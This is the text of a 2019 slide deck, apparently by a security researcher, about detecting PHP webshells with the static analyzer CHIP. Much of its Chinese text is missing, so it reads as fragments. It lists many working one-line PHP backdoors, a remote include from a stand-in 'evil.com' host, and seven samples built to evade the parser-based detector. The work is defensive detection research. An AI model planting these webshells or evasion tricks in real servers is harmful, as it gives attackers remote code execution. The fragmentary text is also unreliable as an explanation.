2019
PHPCHIP.COM
PHP
Phith0n

About Me
phith0n · https://www.leavesongs.com · http://weibo.com/101yx · https://github.com/phith0n
 · https://github.com/chaitin/xray

 · PHP · Python · Golang · Javascript
Hello World

01
PART 01
PHP


CONTENTS
02
PART 02
PHP

03
PART 03


PART 01 PHP
· PHP · PHP Webshell · ""

PHPWeb
PHP PHPWeb
·  ·  ·  Webshell

PHP Webshell
·  · eval($_POST[2333]); · assert($_POST[2333]);
·  · array_map('assert', $_POST); · usort($_POST[1], $_POST[2]);
·  · include $_FILES['2333']['tmp_name']; · require 'http://evil.com/1.txt';

·  · eval(gzdeflate(base64_decode('...'))); · $_=[];$_++;$_++;...;$_($__);
·  · `$_POST[2333]`; · system($_POST[2333]);
·  · create_function('', $_POST[2333]); · preg_replace('/.*/e', $_POST['n'], $_POST[2333]);

PHP


 

preg_replace('/a/i', 'b', $_POST['name']);

include './inc/' . $filename;

eval("\$ret = $arr;");

echo "hello world";

$arr = [$_GET, $_POST, $_COOKIE]; array_map($callback, ...$arr);

foreach (dir('./') as $f) { echo $f->read();
}

 

preg_replace('/a/i', 'b', $_POST['name']);

include './inc/' . $filename;

eval("\$ret = $arr;");

echo "hello world";

$arr = [$_GET, $_POST, $_COOKIE]; array_map($callback, ...$arr);

foreach (dir('./') as $f) { echo $f->read();
}

 
...... $arr = [$_GET, $_POST, $_COOKIE]; array_map($callback, ...$arr);
 array_map('htmlspecialchars', ...$arr);

$callback array_map('assert', ...$arr);

   PHP

PART 02 PHP
· CHIP · CHIP · 

CHIP ­ PHP
: https://phpchip.com  1. 99.9% 2. composer 3. 

CHIP
Ast Tree
Parser

Visitor

Walker

Analyze

CHIP è Parser
PHP-Parser: https://github.com/nikic/PHP-Parser PHP5.2 ~ 7.4
PHP-Parser

CHIP è Walker
ParserAST Tree Node 

Node · Eval_  · FuncCall  · New_MethodCallStaticCall  · Include_ 

CHIP è Analyze
 ·  ·  · 


·  ·  · 


https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html PHP
1. PHP 2.  Callable 3.  


 1. 
·  2. 
· filter_var / filter_var_array 3. PHP

PART 03 
·  · ----



AST Tree

 

FuncCall Node

 






 è
 1. AST Tree 2. FuncCall Node 3.  

PHP 
UsORt($_POST[1], $_POST[2]);

 è 
1  > 1.  

 è
PHP

PHP" "----PHP_FALIAS

 è 
2 · mb_ereg_replace  mbereg_replace · mb_ereg_ireplace  mbereg_ireplace PHP 7.3 
<?php mbereg_replace('.*', '\0', $_REQUEST[2333], 'e');

 è
 > 1.  

PHP 5.6 · PHPHOOK · PHP 5.3 · PHP 5.6

 è 
3 PHP 5.6
<?php use function \assert as test; test($_POST[2333]);

 · AS 

 è
""  > 1.  2.  ""

 è 
4 PHP 
<?php class test extends ReflectionFunction {} $f = new test('system'); $f->invoke($_POST[2333]);

testReflectionFunction

 è 
4 PHP7Webshell
<?php $f = new class('system') extends ReflectionFunction {}; $f->invoke($_POST[2333]);

 è 
4 PHP7Webshell
<?php $f = nEW ClaSs($_POST[666]) eXTeNDs rEFleCTIoNfUNcTIoN {}; $f->iNvOKe($_POST[2333]); "Webshell"""

 è
 > 1.  2.   

  ...  ""



AST Tree

 

FuncCall Node

 






 è

"" 1. usort 2. usort 3.   

PHP5.6 · https://www.leavesongs.com/PHP/bypass-eval-length-
restrict.html
· Python**kwargsPHP...$kwarg 

 è 

5 <?php usort(...$_GET);
2017

 > 1.  2.  3.   

 è
   PHP-Parser  PHP-ParserPHP


PHP-ParserPHP 
printf<char>('hello world') PHP
[\x00-\x20]

 è PHP-Parser
6php-parser webshell
<?php $content = "<?php eval\x01\x02(\$_POST[2333]);"; file_put_contents('shell.php', $content);

 è
 > 1.  2.  3.  4. BUG 

 è
BUGPHP Tricks...... PHP-Parser ·  <?php  ·  <? 

PHP

·  <?php 

·  <? 



·  <% PHP7

·  <script language="php"> PHP7

 è PHP

PHP-Parser 1. PHP 2. PHPAST Tree



7php-parserPHP <script language="php"> eval($_POST[2333]); </script>

 è PHP
 > 1.  2.  3. 

4. BUG 5. 




     


phith0n

